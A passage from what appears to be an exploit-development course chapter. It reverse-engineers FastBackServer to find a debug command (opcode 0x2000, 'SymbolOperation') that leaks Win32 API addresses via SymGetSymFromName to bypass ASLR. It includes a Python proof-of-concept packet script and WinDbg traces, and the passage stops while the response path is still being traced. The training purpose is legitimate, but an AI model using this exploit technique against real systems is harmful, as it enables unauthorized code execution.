However, we might be able to find useful information more quickly by exploring the Win32 APIs imported by the application. If an imported API could lead to an info leak and that function is likely being used somewhere in the application, we may be able to exploit it.
Most Win32 APIs do not pose a security risk but a few can be directly exploited to generate an info leak. These include the DebugHelp APIs1 (from Dbghelp.dll), which are used to resolve function addresses from symbol names.
Similar APIs are CreateToolhelp32Snapshot2 and EnumProcessModules.3 Additionally, an C runtime API like fopen4 can be be used as well.
In this module, we will locate and leverage a "hidden gem" left behind by the developer.
1 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/debug/dbghelp-functions
2 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
3 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumprocessmodules
4 (Cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fopen/
10.2.1. FXCLI_DebugDispatch
Let's begin our investigation of the imported Win32 APIs by opening our previously-analyzed version of FastBackServer.exe in IDA Pro.
We'll navigate to the Imports tab and scroll through all the imported APIs. Eventually, we will find SymGetSymFromName,1 shown in Figure 6.
 
Figure 6: Locating SymGetSymFromName in Imports tab
This API is particularly interesting since it can be used to resolve the memory address of any exported Win32 API by supplying its name.
We don't have enough information yet to determine whether the import of this API poses a security risk. First, let's determine if we can invoke the API by sending a network packet.
Let's double-click on the imported API to continue our analysis in IDA Pro. This leads us to its entry inside the .idata section, as shown in Figure 7.
 
Figure 7: SymGetSymFromName import in .idata section
Next, we'll perform a cross-reference of the API using the X hotkey, which displays the two results shown in Figure 8.
 
Figure 8: Cross reference on SymGetSymFromName
Since both these addresses are the same, we know that this API is only used once. We can double-click on either address to jump to the basic block where the API is invoked, as displayed in Figure 9.
 
Figure 9: Basic block responsible for invoking SymGetSymFromName
Our goal is to use static analysis to determine if we can send a network packet to reach this basic block. We'll need to find an execution path from FXCLI_OraBR_Exec_Command to the SymGetSymFromName API based on the opcode we provide.
To speed up our initial discovery process we'll perform a backward analysis. We'll first cross-reference the involved function calls, ignoring, for now, individual instructions and branching statements inside the current function.
We can begin the analysis by locating the beginning of the current function. Figure 10 shows the graph overview.
 
Figure 10: Graph layout of current function
This is a large function, which is worth keeping in mind when we return to it later.
Clicking on the upper left-hand side of the graph overview reveals the start of the function and its name, which is FXCLI_DebugDispatch, as shown in Figure 11.
 
Figure 11: Start of function FXCLI_DebugDispatch
Next, we'll perform a cross-reference by clicking on the highlighted section and pressing X to find which functions call it.
 
Figure 12: Cross reference of FXCLI_DebugDispatch
The cross-reference results reveal a single function, FXCLI_OraBR_Exec_Command.
If we double-click on the search result, we jump to the basic block that calls FXCLI_DebugDispatch, as shown in Figure 13.
 
Figure 13: Start of function FXCLI_DebugDispatch
We now know that FXCLI_DebugDispatch is called from FXCLI_OraBR_Exec_Command. Next we must determine which opcode triggers the correct code path.
Moving up one basic block, we discover the comparison instruction shown in Figure 14.
 
Figure 14: FXCLI_DebugDispatch is reached from opcode 0x2000
As displayed in the above figure, the code compares the value 0x2000 and a DWORD at an offset from EBP. As discussed in previous modules, this offset is used to specify the opcode.
This is definitely a good start since now we know that the opcode value of 0x2000 will trigger the correct code path, but we have not yet determined the buffer contents required to reach the correct basic block inside FXCLI_DebugDispatch.
Our next goal is to develop a proof of concept that will trigger the SymGetSymFromName call inside FXCLI_DebugDispatch. We'll reuse our basic proof of concept from the previous modules, and update the opcode value.
import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41]*0xC)
buf += pack("<i", 0x2000)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += b"A" * 0x100
buf += b"B" * 0x100
buf += b"C" * 0x100

# Checksum
buf = pack(">i", len(buf)-4) + buf

def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	s.send(buf)
	s.close()

	print("[+] Packet sent")
	sys.exit(0)


if __name__ == "__main__":
 	main()
Listing 4 - Basic proof of concept to reach opcode 0x2000
Our modified proof of concept uses the opcode value 0x2000 along with a psCommandbuffer consisting of 0x100 As, Bs, and Cs, as displayed in Listing 4.
Since WinDbg is already attached to FastBackServer, we can place a breakpoint on the comparison of the opcode value. Because WDEG cannot randomize the base address of FastBackServer, we can continue using the static addresses found in IDA Pro for our breakpoint.
Next, let's launch our proof of concept.
0:067> bp 0x56d1ef

0:067> g
Breakpoint 0 hit
eax=0609c8f0 ebx=0609c418 ecx=00002000 edx=00000001 esi=0609c418 edi=00669360
eip=0056d1ef esp=0d47e334 ebp=0d4dfe98 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!FXCLI_OraBR_Exec_Command+0xd39:
0056d1ef 81bdd0e4f9ff00200000 cmp dword ptr [ebp-61B30h],2000h ss:0023:0d47e368=00002000
Listing 5 - Breaking at opcode 0x2000 comparison
From the highlighted values in Listing 5, it is evident that our proof of concept and prior analysis were correct. We have reached the branching statement leading to the code path of opcode 0x2000.
We can now single-step through the comparison to the call into FXCLI_DebugDispatch. We'll dump the arguments here, as shown in Listing 6.
eax=0d4d3b30 ebx=0609c418 ecx=018e43a8 edx=0d4d3b2c esi=0609c418 edi=00669360
eip=0057381c esp=0d47e328 ebp=0d4dfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x7366:
0057381c e85fa30000      call    FastBackServer!FXCLI_DebugDispatch (0057db80)

0:006> dd esp L3
0d47e328  018e43a8 0d4d3b30 0d4d3b2c

0:006> dd 0d4d3b30 
0d4d3b30  41414141 41414141 41414141 41414141
0d4d3b40  41414141 41414141 41414141 41414141
0d4d3b50  41414141 41414141 41414141 41414141
0d4d3b60  41414141 41414141 41414141 41414141
0d4d3b70  41414141 41414141 41414141 41414141
0d4d3b80  41414141 41414141 41414141 41414141
0d4d3b90  41414141 41414141 41414141 41414141
0d4d3ba0  41414141 41414141 41414141 41414141
Listing 6 - psCommandBuffer as argument to FXCLI_DebugDispatch
The first part of psCommandBuffer consists of 0x41s. This means that the second argument to FXCLI_DebugDispatch is under our control.
In summary, we discovered that the target application uses the SymGetSymFromName API, which we may be able to leverage to bypass ASLR. We also created a proof of concept enabling us to reach the function that invokes SymGetSymFromName.
In the next section, we'll navigate FXCLI_DebugDispatch to determine how we can resolve the address of an arbitrary Win32 API.
Exercises
1.	Repeat the analysis that leads to locating FXCLI_DebugDispatch.
2.	Craft a proof of concept that allows you to call FXCLI_DebugDispatch.
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname
10.2.2. Arbitrary Symbol Resolution
Now, we're ready to step into FXCLI_DebugDispatch to determine how to reach the correct basic block.
As mentioned, FXCLI_DebugDispatch is a large function. The graph overview from IDA Pro is repeated in Figure 10.
 
Figure 15: Graph layout of FXCLI_DebugDispatch
The figure above also reveals many branching statements within the function. These types of branching code paths are typically the result of if and else statements in the C source code.
When we start to trace through the function, we discover a repeating pattern that begins from the first basic block.
The code of the first basic block from FXCLI_DebugDispatch is shown in Figure 16.
 
Figure 16: First basic block of FXCLI_DebugDispatch
In the first highlighted portion of the basic block, FXCLI_DebugDispatch calls _ml_strbytelen. This is a wrapper function around strlen,1 a function that finds the length of the string given as an argument.
The argument string in this case is "help", which means _ml_strbytelen should return the value "4".
Next, FXCLI_DebugDispatch calls _ml_strnicmp, which is a wrapper around strnicmp.2 This API compares two strings up to a maximum number of characters, ignoring the case.
In our case, the maximum number of characters to compare is the result of the _ml_strbytelen function, which is the value "4". That means _ml_strnicmp performs a comparison between "help" and the contents at the memory address in Str1.
We can verify our static analysis and obtain the contents of the unknown string by single-stepping until the call to ml_strnicmp and inspecting the API's three arguments:
eax=0d4d3b30 ebx=0609c418 ecx=0085dbe4 edx=7efefeff esi=0609c418 edi=00669360
eip=0057dbae esp=0d47da30 ebp=0d47e320 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FXCLI_DebugDispatch+0x2e:
0057dbae e8c4d40d00      call    FastBackServer!ml_strnicmp (0065b077)

0:006> dd esp L3
0d47da30  0d4d3b30 0085dbec 00000004

0:006> da 0085dbec 
0085dbec  "help"

0:006> da 0d4d3b30 
0d4d3b30  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d4d3c30  ""
Listing 7 - String compare operation on our input
The output confirms that the maximum size argument contains the value "4". We also observe that the dynamic string comes from the psCommandBuffer, which is under our control.
Since the first four characters of the strings do not match, the API returns a non-zero value:
0:006> r eax
eax=ffffffff

0:006> p
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
eip=0057dbb6 esp=0d47da3c ebp=0d47e320 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FXCLI_DebugDispatch+0x36:
0057dbb6 85c0            test    eax,eax

0:006> p
eax=ffffffff ebx=0609c418 ecx=ffffffff edx=0d4d2030 esi=0609c418 edi=00669360
eip=0057dbb8 esp=0d47da3c ebp=0d47e320 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
FastBackServer!FXCLI_DebugDispatch+0x38:
0057dbb8 0f85fd010000    jne     FastBackServer!FXCLI_DebugDispatch+0x23b (0057ddbb) [br=1]
Listing 8 - Comparison and jump due to string compare
The return value is used in a TEST instruction, along with a JNE. Because the return value is non-zero, we execute the jump.
From here, the ml_strnicmp call we have just analyzed is repeated for different strings in a series of if and else statements visually represented in the graph overview. Figure 17 shows the next two string comparisons.
 
Figure 17: String comparisons
As we will soon confirm, these basic assembly blocks can be translated to a series of branch statements in C. When each string comparison succeeds, it leads to the invocation of a FastBackServer internal function.
Now that we understand the high level flow of the function, let's speed up our analysis by navigating to the basic block just prior to the SymGetSymFromName call. Here we find the comparison shown in Figure 18.
 
Figure 18: First basic block of FXCLI_DebugDispatch
Based on the comparison, we know that our input string must be equal to "SymbolOperation".
We can pass the comparison by updating our proof of concept, as shown in Listing 9.
...
# psCommandBuffer
buf += b"SymbolOperation"
buf += b"A" * (0x100 - len("SymbolOperation"))
buf += b"B" * 0x100
buf += b"C" * 0x100
...
Listing 9 - Updated input buffer to pass comparison
We'll set the input buffer to the string "SymbolOperation" followed by A's.
Next, we'll clear any previous breakpoints in WinDbg, set a breakpoint on the call to ml_strnicmp at 0x57e84a, and continue execution. We'll reach the breakpoint we just set with old data from our previous proof of concept, so we need to continue execution once more before launching the updated proof of concept.
When the updated proof of concept is executed, we trigger the breakpoint.
Breakpoint 0 hit
eax=0000000f ebx=0602bd30 ecx=0085e930 edx=0d563b30 esi=0602bd30 edi=00669360
eip=0057e84a esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FXCLI_DebugDispatch+0xcca:
0057e84a e828c80d00      call    FastBackServer!ml_strnicmp (0065b077)

0:001> da poi(esp)
0d563b30  "SymbolOperationAAAAAAAAAAAAAAAAA"
0d563b50  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563b70  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563b90  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563bb0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563bd0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563bf0  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563c10  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d563c30  ""

0:001> p
eax=00000000 ebx=0602bd30 ecx=00000000 edx=0d562030 esi=0602bd30 edi=00669360
eip=0057e84f esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
FastBackServer!FXCLI_DebugDispatch+0xccf:
0057e84f 83c40c          add     esp,0Ch

0:001> r eax
eax=00000000
Listing 10 - Passing string comparison
Since we submitted the correct string, the TEST instruction will ensure we take the code path leading to the SymGetSymFromName call.
Let's set a breakpoint on the call to SymGetSymFromName at 0x57e984 and continue execution.
0:001> bp 0057e984

0:001> g
Breakpoint 1 hit
eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360
eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
FastBackServer!FXCLI_DebugDispatch+0xe04:
0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName (0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}
Listing 11 - Call to SymGetSymFromName
As shown in the listing, our proof of concept reaches the call to SymGetSymFromName. Next, we need to understand its arguments so we can resolve a function address.
Let's review the function prototype3 (shown in Listing 12).
BOOL IMAGEAPI SymGetSymFromName(
  HANDLE           hProcess,
  PCSTR            Name,
  PIMAGEHLP_SYMBOL Symbol
);
Listing 12 - Function prototype for SymGetSymFromName
Specifically, we'll explore the last two arguments. The second argument, Name, is a pointer to the symbol name that will be resolved. It must be provided as a null-terminated string.
We can check the current content of the second argument with WinDbg.
eax=ffffffff ebx=0602bd30 ecx=0d50da8c edx=0d50dca0 esi=0602bd30 edi=00669360
eip=0057e984 esp=0d50da30 ebp=0d50e320 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
FastBackServer!FXCLI_DebugDispatch+0xe04:
0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName (0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}

0:079> da poi(esp+4)
0d50da8c  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0d50daac  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
...
Listing 13 - Second argument for SymGetSymFromName
From Listing 13, we discover that the second argument is our input string that was appended to the "SymbolOperation" string.
This means we can provide the name of an arbitrary Win32 API and have its address resolved by SymGetSymFromName. Very nice.
The last argument is a structure of type PIMAGEHLP_SYMBOL,4 as shown in Listing 14.
typedef struct _IMAGEHLP_SYMBOL {
  DWORD SizeOfStruct;
  DWORD Address;
  DWORD Size;
  DWORD Flags;
  DWORD MaxNameLength;
  CHAR  Name[1];
} IMAGEHLP_SYMBOL, *PIMAGEHLP_SYMBOL;
Listing 14 - IMAGEHLM_SYMBOL structure
This structure is initialized within the same basic block (address 0x57E957) and populated by SymGetSymFromName. We are interested in the second field of this structure, which will contain the resolved API's memory address returned by SymGetSymFromName. If all goes well, we'll later use this address to bypass ASLR.
Let's try to resolve the memory address of an API by updating our proof of concept to contain the name of the Win32 WriteProcessMemory API, which we can use to bypass DEP.
# psCommandBuffer
symbol = b"SymbolOperationWriteProcessMemory" + b"\x00"
buf += symbol + b"A" * (100 - len(symbol))
buf += b"B" * 0x100
buf += b"C" * 0x100
Listing 15 - Updated proof of concept with WriteProcessMemory function name
We'll remove the breakpoint on the call to ml_strnicmp at 0x57e84a and let execution continue. Now we're ready to execute the updated proof of concept.
0:077> bc 0

0:077> g
Breakpoint 0 hit
eax=ffffffff ebx=0608c418 ecx=0db5da8c edx=0db5dca0 esi=0608c418 edi=00669360
eip=0057e984 esp=0db5da30 ebp=0db5e320 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
FastBackServer!FXCLI_DebugDispatch+0xe04:
0057e984 ff15e4e76700    call    dword ptr [FastBackServer!_imp__SymGetSymFromName (0067e7e4)] ds:0023:0067e7e4={dbghelp!SymGetSymFromName (6dbfea10)}

0:079> da poi(esp+4)
0db5da8c  "WriteProcessMemory"
Listing 16 - WriteProcessMemory as input to SymGetSymFromName
This reveals the expected input string, "WriteProcessMemory".
Before executing SymGetSymFromName, we'll dump the contents of the address field in the PIMAGEHLP_SYMBOL structure.
0:079> dd esp+8 L1
0db5da38  0db5dca0

0:079> dds 0db5dca0+4 L1
0db5dca4  00000000

0:079> p
eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
eip=0057e98a esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_DebugDispatch+0xe0a:
0057e98a 898574f9ffff    mov     dword ptr [ebp-68Ch],eax ss:0023:0db5dc94=00000001

0:079> dds 0db5dca0+4 L1
0db5dca4  75342890 KERNEL32!WriteProcessMemoryStub
Listing 17 - Resolving WriteProcessMemory with SymGetSymFromName
When we inspect the contents of the second field in the PIMAGEHLP_SYMBOL structure before the call, we find it is empty (0x000000).
However, after the call to SymGetSymFromName, we notice that it has been populated by the API and contains the address of WriteProcessMemory.
From our last test, it seems that we should be able to abuse the FXCLI_DebugDispatch function. However, we still have to determine if we are able to read the results returned by SymGetSymFromName from the network. If we can, we should be able to bypass ASLR and combine that with a DEP bypass through ROP to obtain code execution.
Exercises
1.	Repeat the analysis leading to the execution of SymGetSymFromFile.
2.	Craft a proof of concept that resolves WriteProcessMemory and verify that it works by setting a breakpoint on the call to SymGetSymFromFile.
1 (Microsoft, 2020), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strlen-wcslen-mbslen-mbslen-l-mbstrlen-mbstrlen-l?view=msvc-160
2 (Microsoft, 2020), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strnicmp-wcsnicmp-mbsnicmp-strnicmp-l-wcsnicmp-l-mbsnicmp-l?view=msvc-160
3 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-symgetsymfromname
4 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/dbghelp/ns-dbghelp-imagehlp_symbol
10.2.3. Returning the Goods
We know that we can trigger the execution of SymGetSymFromName through FXCLI_DebugDispatch and resolve the address of an arbitrary function. Next, we need to figure out how to retrieve the values.
Our input triggers SymGetSymFromName through a network packet. It makes sense that, for the functionality to be useful, there will be a code path that returns the value to us. To find this code path, we must continue our reverse engineering effort.
First, we must navigate our way out of the FXCLI_DebugDispatch function. Let's inspect the return value of SymGetSymFromName to determine which path is taken next.
0:077> r eax
eax=00000001

0:077> p
eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
eip=0057e990 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_DebugDispatch+0xe10:
0057e990 83bd74f9ffff00  cmp     dword ptr [ebp-68Ch],0 ss:0023:0db5dc94=00000001

0:077> p
eax=00000001 ebx=0608c418 ecx=36be0505 edx=00020b40 esi=0608c418 edi=00669360
eip=0057e997 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_DebugDispatch+0xe17:
0057e997 0f8495060000    je      FastBackServer!FXCLI_DebugDispatch+0x14b2 (0057f032) [br=0]
Listing 18 - Inspecting the return value from SymGetSymFromName
The highlighted jump instruction is not executed because the return value is non-null.
Next, we encounter a large basic block that performs several string manipulations. The first of these manipulations is displayed in Figure 19.
 
Figure 19: String manipulations on output
We can observe that the output of the sprintf call is stored on the stack at an offset from EBP+arg_0. Two more calls to sprintf follow, where the output is stored at an offset from EBP+arg_0.
We're only interested in the final string, so we can dump the storage address at EBP+arg_0 and inspect it at the end of the basic block. To find the value of arg_0, we'll first navigate to the start of FXCLI_DebugDispatch.
 
Figure 20: Numerical value of arg_0
Since arg_0 translates to the value "8", we can dump the contents of EBP+8 at the start of the basic block:
0:077> dd ebp+8 L1
0db5e328  00ede3a8
Listing 19 - Contents of arg_0
Next, let's set a breakpoint on the TEST instruction at 0x57ea23, which is at the end of the basic block where sprintf is called three times.
After we hit the breakpoint, we find the final contents of the string buffer.
0:077> bp 0057ea23

0:077> g
Breakpoint 0 hit
eax=ffffffff ebx=0608c418 ecx=0085ea04 edx=0db5db8c esi=0608c418 edi=00669360
eip=0057ea23 esp=0db5da3c ebp=0db5e320 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FXCLI_DebugDispatch+0xea3:
0057ea23 85c0            test    eax,eax

0:077> da 00ede3a8
00ede3a8  "XpressServer: SymbolOperation .-"
00ede3c8  "------------------------------ ."
00ede3e8  "Value of [WriteProcessMemory] is"
00ede408  ": ..Address is: 0x75342890 .Flag"
00ede428  "s are: 0x207 .Size is : 0x20 ."
Listing 20 - Text output from FXCLI_DebugDispatch
Listing 20 shows that the buffer contains, among other things, the memory address of WriteProcessMemory.
At this point the execution leads us to the end of the function where we return to FXCLI_OraBR_Exec_Command (address 0x573821, Figure 21) just after the call to FXCLI_DebugDispatch.
 
Figure 21: Return to FXCLI_OraBR_Exec_Command from FXCLI_DebugDispatch
The first comparison after returning is a NULL check of EAX, which is the return value from FXCLI_DebugDispatch.
To find the return value, we can let the function return in WinDbg and dump EAX.
0:077> r eax
eax=00000001

0:077> p
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=0057382a esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!FXCLI_OraBR_Exec_Command+0x7374:
0057382a 83bddcdafeff00  cmp     dword ptr [ebp-12524h],0 ss:0023:0dbad974=00000001

0:077> p
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=00573831 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x737b:
00573831 740c            je      FastBackServer!FXCLI_OraBR_Exec_Command+0x7389 (0057383f) [br=0]

0:077> p
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=00573833 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x737d:
00573833 c785b4dafeff01000000 mov dword ptr [ebp-1254Ch],1 ss:0023:0dbad94c=00000000
Listing 21 - Value 1 in temporary variable
As shown in the listing above, the return value in EAX is 1, so the jump is not taken.
Following execution, we'll eventually reach the basic block shown in Figure 22.
 
Figure 22: Many code paths leading to basic block
This figure shows many code paths converging at this address.
The comparison in this basic block is performed against a variable we do not control. To learn what happens at runtime, we need to single-step in WinDbg until we reach the basic block shown in Figure 22.
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=00575a62 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x95ac:
00575a62 83bde4dafeff00  cmp     dword ptr [ebp-1251Ch],0 ss:0023:0dbad97c=00000000

0:077> p
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=00575a69 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x95b3:
00575a69 0f84ec000000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x96a5 (00575b5b) [br=1]

0:077> p
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=00575b5b esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!FXCLI_OraBR_Exec_Command+0x96a5:
00575b5b 83bdb8dafeff00  cmp     dword ptr [ebp-12548h],0 ss:0023:0dbad950=00000001

0:077> p
eax=00000001 ebx=0608c418 ecx=0000009e edx=0db5db8c esi=0608c418 edi=00669360
eip=00575b62 esp=0db5e334 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x96ac:
00575b62 0f8494010000    je      FastBackServer!FXCLI_OraBR_Exec_Command+0x9846 (00575cfc) [br=0]
Listing 22 - Two comparisons to local variables
The first jump is taken (as shown in Listing 22), after which we encounter another comparison. This branch also uses a variable that is out of our control, and the second jump is not taken.
Next, we arrive at the basic block displayed in Figure 23.
 
Figure 23: Basic block with call to FX_AGENT_S_GetConnectedIpPort
The key point in this block is the call to FX_AGENT_S_GetConnectedIpPort. Keeping in mind our goal of returning the results from SymGetSymFromName to us via a network packet, this function name seems promising.
Observing this basic block more closely, the addresses in ECX and EDX come from an LEA instruction. When this instruction is used just before a CALL, it typically indicates that the memory address stored in the register (ECX and EDX in this case) is used to return the output of the invoked function. Let's verify this.
We'll continue to the function call and then dump the memory of the two stack variables pointed to by the LEA instructions, before and after the call.
eax=0608c8f0 ebx=0608c418 ecx=04fd0020 edx=0dbb9cdc esi=0608c418 edi=00669360
eip=00575b80 esp=0db5e328 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x96ca:
00575b80 e85cc70000      call    FastBackServer!FX_AGENT_S_GetConnectedIpPort (005822e1)

0:077> dd ebp-12550 L1
0dbad948  00000000

0:077> dd ebp-61BC L1
0dbb9cdc  00000000

0:077> p
eax=00000001 ebx=0608c418 ecx=04fd0020 edx=8eb020d0 esi=0608c418 edi=00669360
eip=00575b85 esp=0db5e328 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
FastBackServer!FXCLI_OraBR_Exec_Command+0x96cf:
00575b85 83c40c          add     esp,0Ch

0:077> dd ebp-12550 L1
0dbad948  000020d0

0:077> dd ebp-61BC L1
0dbb9cdc  7877a8c0
Listing 23 - Resolving IP and port of Kali
From Listing 23, we notice that the two memory locations passed as arguments through the LEA instructions are indeed populated during this call. Let's try to understand what these values represent.
Because of the function's name, we can guess that these values relate to an existing IP address and port. Typically, a TCP connection is created by calling the connect1 API, which has the function prototype shown in Listing 24.
int WSAAPI connect(
  SOCKET         s,
  const sockaddr *name,
  int            namelen
);
Listing 24 - Function prototype for connect
The second argument in this function prototype is a structure called sockaddr. In IP version 4, this structure is called sockaddr_in.2
Listing 25 displays the structure of sockaddr_in as documented on MSDN.
struct sockaddr_in {
        short   sin_family;
        u_short sin_port;
        struct  in_addr sin_addr;
        char    sin_zero[8];
};
Listing 25 - Sockaddr_in structure
The IP address is represented as a structure of type in_addr, while the port is specified as an unsigned word.
As shown in Listing 26, the in_addr structure3 represents the IP address with each octet as a single byte. We can obtain the IP address from the second DWORD returned by FX_AGENT_S_GetConnectedIpPort.
0:077> dd ebp-61BC L1
0dbb9cdc  7877a8c0

0:005> ? c0;? a8;? 77;? 78
Evaluate expression: 192 = 000000c0
Evaluate expression: 168 = 000000a8
Evaluate expression: 119 = 00000077
Evaluate expression: 120 = 00000078
Listing 26 - Locating the IP address
If each of the bytes are translated from hexadecimal to decimal in reverse order, they reveal the IP address our of Kali Linux machine (192.168.119.120).
We can also reverse the order of the DWORD and convert it to decimal to reveal the port number, as shown below.
0:077> dd ebp-12550 L1
0dbad948  000020d0

0:077> ? d020
Evaluate expression: 53280 = 0000d020
Listing 27 - Locating the port number
